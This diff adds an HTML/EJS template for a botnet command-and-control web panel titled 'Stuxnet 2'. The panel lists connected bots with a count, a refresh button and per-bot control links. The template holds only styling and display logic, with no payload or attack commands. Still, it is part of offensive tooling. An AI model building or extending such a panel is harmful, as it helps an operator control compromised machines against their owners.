@@ -1,0 +1,79 @@
+<html>
+    <head><title>
+        Command And Control Server
+    </title>
+    <style>
+    #refresh:hover{
+        color: rgb(75, 226, 231);
+        background-color: #060a01;
+        text-decoration: none;
+    }
+    a{
+        text-decoration: none;
+        
+    }
+    form{
+        font-family: Arial;
+        border-color: black;
+        color: deepskyblue;
+        text-align: center;
+        margin-top: 25px;
+    }
+    div{
+        font-family: Arial;
+        border-color: black;
+        color: deepskyblue;
+        text-align: center;
+        margin-top: 30px;
+    }
+    #bot:hover{
+        color: rgb(11, 3, 29);
+    }
+    #bot
+    {
+    border: 6px solid;
+    margin: 0;
+    width: 250px;
+    padding: 13px;
+    text-align: center;
+    margin-top: 20px;
+    margin-inline-start: 620px;
+    }
+    #title
+    {font-family: Algerian;
+        size: 36px;
+        color: darkcyan;
+        background-color: black;
+        /* width: 300px; */
+        text-align: center;}
+    </style>
+    </head>
+<body>
+    <h1 id='title'>
+    <centre>
+        Stuxnet 2
+    </centre>
+    </h1>
+    <p>
+        <form action="/refresh" method="POST">
+        <button id='refresh' type="submit">
+            Refresh
+        </button>
+    </form>
+    </p>
+    <div>
+        <bold>
+            Botnet count : <%= bots.length %>
+        </bold>
+            <% for (var i=0; i < bots.length; i++) {%>
+            <a href="/control?id=<%= bots[i] %>">
+            <div id='bot' >
+            <centre>
+            <%= bots[i] %>
+        </centre>
+        </div>
+            </a>
+        <% }; %>
+    </div>
+</body>
+</html>
